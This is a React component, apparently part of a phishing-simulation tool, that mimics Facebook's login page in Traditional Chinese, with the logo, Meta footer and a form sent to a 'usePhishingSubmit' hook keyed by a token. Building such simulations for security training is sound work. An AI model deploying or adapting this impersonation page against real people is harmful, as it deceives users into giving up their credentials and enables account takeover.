"use client";

import { usePhishingSubmit } from "./usePhishingSubmit";

export default function FacebookLogin({ token }: { token: string }) {
  const { loading, handleSubmit } = usePhishingSubmit(token);

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col items-center justify-center">
      <div className="flex flex-col lg:flex-row items-center gap-8 lg:gap-24 max-w-[980px] w-full px-4">
        {/* Left side - branding */}
        <div className="text-center lg:text-left lg:flex-1">
          <svg viewBox="0 0 36 36" className="w-[60px] h-[60px] lg:w-[80px] lg:h-[80px] mb-2" fill="url(#fb-gradient)">
            <defs>
              <linearGradient id="fb-gradient" x1="50%" x2="50%" y1="97.0782%" y2="0%">
                <stop offset="0%" stopColor="#0062E0" />
                <stop offset="100%" stopColor="#19AFFF" />
              </linearGradient>
            </defs>
            <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z" />
            <path fill="white" d="M25 23l.8-5H21v-3.5c0-1.4.5-2.5 2.7-2.5H26V7.4c-1.3-.2-2.7-.4-4-.4-4.1 0-7 2.5-7 7v4h-4.5v5H15v12.7c1 .2 2 .3 3 .3s2-.1 3-.3V23h4z" />
          </svg>
          <h1 className="text-[#1c1e21] text-2xl lg:text-[28px] leading-tight font-normal hidden lg:block">
            探索你喜愛的事物
          </h1>
        </div>

        {/* Right side - login form */}
        <div className="w-full max-w-[396px]">
          <div className="bg-white rounded-lg shadow-lg p-4 pb-6">
            <form onSubmit={handleSubmit}>
              <div className="mb-3">
                <input
                  type="text"
                  placeholder="電子郵件地址或電話號碼"
                  className="w-full px-4 py-3.5 border border-[#dddfe2] rounded-md text-[17px] outline-none focus:border-[#1877f2] focus:shadow-[0_0_0_2px_#e7f3ff]"
                  autoComplete="off"
                />
              </div>
              <div className="mb-3">
                <input
                  type="password"
                  placeholder="密碼"
                  className="w-full px-4 py-3.5 border border-[#dddfe2] rounded-md text-[17px] outline-none focus:border-[#1877f2] focus:shadow-[0_0_0_2px_#e7f3ff]"
                  autoComplete="off"
                />
              </div>
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-[#1877f2] text-white py-3 rounded-md text-[20px] font-bold hover:bg-[#166fe5] transition-colors disabled:opacity-50"
              >
                {loading ? "登入中..." : "登入"}
              </button>
              <div className="text-center mt-4">
                <a href="#" className="text-[#1877f2] text-sm hover:underline">
                  忘記密碼？
                </a>
              </div>
              <hr className="my-5 border-[#dadde1]" />
              <div className="text-center">
                <button
                  type="button"
                  className="bg-[#42b72a] text-white px-4 py-3 rounded-md text-[17px] font-bold hover:bg-[#36a420] transition-colors"
                >
                  建立新帳號
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>

      {/* Footer */}
      <div className="mt-8 text-center text-[12px] text-[#737373]">
        <p>Meta &copy; 2026</p>
      </div>
    </div>
  );
}
